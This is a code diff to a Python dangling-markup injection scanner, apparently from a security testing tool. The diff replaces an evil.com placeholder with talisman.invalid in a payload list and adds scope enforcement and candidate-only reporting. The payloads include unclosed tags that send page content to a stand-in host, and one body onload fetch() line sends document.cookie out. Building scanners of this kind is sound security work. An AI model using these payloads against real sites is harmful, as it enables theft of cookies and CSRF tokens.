@@ -25,19 +25,19 @@ DANGLING_ENDPOINTS = [
 
 DANGLING_PAYLOADS = [
     # Classic dangling markup — captures content until next matching quote
-    ('<img src="https://evil.com/steal?data=', "Img src dangling markup"),
-    ('<form action="https://evil.com/steal"><input name="data" value="', "Form input value dangling markup"),
-    ('<a href="https://evil.com/steal?data=', "Anchor href dangling markup"),
-    ('<iframe src="https://evil.com/steal?data=', "Iframe src dangling markup"),
-    ('<frame src="https://evil.com/steal?data=', "Frame src dangling markup"),
+    ('<img src="https://talisman.invalid/steal?data=', "Img src dangling markup"),
+    ('<form action="https://talisman.invalid/steal"><input name="data" value="', "Form input value dangling markup"),
+    ('<a href="https://talisman.invalid/steal?data=', "Anchor href dangling markup"),
+    ('<iframe src="https://talisman.invalid/steal?data=', "Iframe src dangling markup"),
+    ('<frame src="https://talisman.invalid/steal?data=', "Frame src dangling markup"),
     ('<input type="hidden" name="csrf" value="', "Hidden input value dangling markup"),
-    ('<meta http-equiv="refresh" content="0;url=https://evil.com/steal?data=', "Meta refresh dangling markup"),
+    ('<meta http-equiv="refresh" content="0;url=https://talisman.invalid/steal?data=', "Meta refresh dangling markup"),
     # CSS background URL capture
-    ('<style>body{background:url("https://evil.com/steal?data=', "CSS background URL dangling markup"),
+    ('<style>body{background:url("https://talisman.invalid/steal?data=', "CSS background URL dangling markup"),
     # Link tag
-    ('<link rel="stylesheet" href="https://evil.com/steal?data=', "Link href dangling markup"),
+    ('<link rel="stylesheet" href="https://talisman.invalid/steal?data=', "Link href dangling markup"),
     # Script-less event handler
-    ('<body onload="fetch(\'https://evil.com/steal?data=\'+document.cookie)">', "Body onload data exfil (no script tag)"),
+    ('<body onload="fetch(\'https://talisman.invalid/steal?data=\'+document.cookie)">', "Body onload data exfil (no script tag)"),
 ]
 
 
@@ -120,7 +120,7 @@ async def _test_dangling_form_hijack(
 
     # Form hijacking payload: start a form that points to evil.com
     # and leave it unclosed to capture subsequent form fields
-    form_payload = f'<form id="{canary}" action="https://evil.com/steal"><input type="hidden" name="csrf_token" value="'
+    form_payload = f'<form id="{canary}" action="https://talisman.invalid/steal"><input type="hidden" name="csrf_token" value="'
 
     try:
         r = await client.get(test_url, params={"q": form_payload}, timeout=8)
@@ -153,50 +153,54 @@ async def run(
     proxy: str | None = None,
     **kwargs: Any,
 ) -> dict[str, Any]:
+    """Identify reflection candidates; browser-side capture is not inferred."""
     url = target if "://" in target else f"https://{target}"
-    console.print(f"\n[module][+] Dangling Markup Injection Scanner[/module] -> [target]{url}[/target]")
-    findings: list[dict[str, Any]] = []
+    if scope is None:
+        return {
+            "target": url, "findings": [], "candidates": [], "count": 0,
+            "candidate_count": 0, "error": "scope_enforcer_required",
+        }
+    scope.assert_in_scope(url)
 
-    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
-        console.print(f"  Testing {len(DANGLING_ENDPOINTS)} endpoints for dangling markup...")
+    console.print(
+        f"\n[module][+] Dangling Markup Candidate Scanner[/module] -> [target]{url}[/target]"
+    )
+    candidates: list[dict[str, Any]] = []
 
+    async with TalismanHTTPClient(proxy=proxy, timeout=12, scope=scope) as client:
         for endpoint in DANGLING_ENDPOINTS:
-            # -- 1. Standard dangling markup ------------------------------------------
-            dm_findings = await _test_dangling_markup(url, endpoint, client)
-            for f in dm_findings:
-                ftype = f.get("type", "dangling_markup")
-                title = f"Dangling markup injection at {endpoint}: {f.get('description', '')}"
-                print_finding(title, "high", url)
-                findings.append(f)
-                if session:
-                    await session.add_finding(
-                        target=url, module="dangling_markup",
-                        vuln_type=ftype,
-                        severity="high", confidence="confirmed",
-                        title=title,
-                        description=f"Dangling markup injection confirmed at {endpoint}. Payload '{f.get('payload_preview', '')}' reflected and captured subsequent content, allowing exfiltration of page data including CSRF tokens and user content.",
-                        evidence=f.get("evidence", ""),
-                        remediation="1. HTML-encode all user-supplied data before rendering. 2. Specifically encode angle brackets (< >) and quotes (' \"). 3. Use Content-Type: text/plain for reflected data where possible. 4. Set X-Content-Type-Options: nosniff.",
-                        cvss_score=7.5, cwe="CWE-79",
-                    )
+            for candidate in await _test_dangling_markup(url, endpoint, client):
+                candidates.append({
+                    **candidate,
+                    "confidence": "candidate",
+                    "requires_browser_verification": True,
+                    "verification_required": (
+                        "Confirm the reflected bytes form executable HTML in the "
+                        "relevant browser context, then demonstrate a controlled "
+                        "same-origin canary capture. Reflection alone does not "
+                        "prove dangling-markup execution or data exfiltration."
+                    ),
+                })
 
-            # -- 2. Form hijacking (CSRF token capture) --------------------------------
-            fh_findings = await _test_dangling_form_hijack(url, endpoint, client)
-            for f in fh_findings:
-                title = f"Dangling markup — form hijacking at {endpoint}: CSRF token capture possible"
-                print_finding(title, "critical", url)
-                findings.append(f)
-                if session:
-                    await session.add_finding(
-                        target=url, module="dangling_markup",
-                        vuln_type="form_hijack",
-                        severity="critical", confidence="confirmed",
-                        title=title,
-                        description=f"Dangling markup form hijacking confirmed at {endpoint}. An unclosed form tag captured CSRF tokens or other sensitive page content, allowing attacker exfiltration.",
-                        evidence=f.get("evidence", ""),
-                        remediation="1. HTML-encode all reflected input. 2. Use CSP with form-action to restrict form submission targets. 3. Implement CSRF tokens that are bound to user sessions.",
-                        cvss_score=9.1, cwe="CWE-79",
-                    )
+            for candidate in await _test_dangling_form_hijack(url, endpoint, client):
+                candidates.append({
+                    **candidate,
+                    "confidence": "candidate",
+                    "requires_browser_verification": True,
+                    "verification_required": (
+                        "The response must be parsed by a browser and shown to "
+                        "capture a non-sensitive test canary. A reflected form "
+                        "element does not prove that a CSRF token was captured."
+                    ),
+                })
 
-    console.print(f"  Dangling markup scan complete -- {len(findings)} issues")
-    return {"target": url, "findings": findings, "count": len(findings)}
+    console.print(
+        f"  Dangling-markup scan complete -- {len(candidates)} candidates require browser verification"
+    )
+    return {
+        "target": url,
+        "findings": [],
+        "candidates": candidates,
+        "count": 0,
+        "candidate_count": len(candidates),
+    }
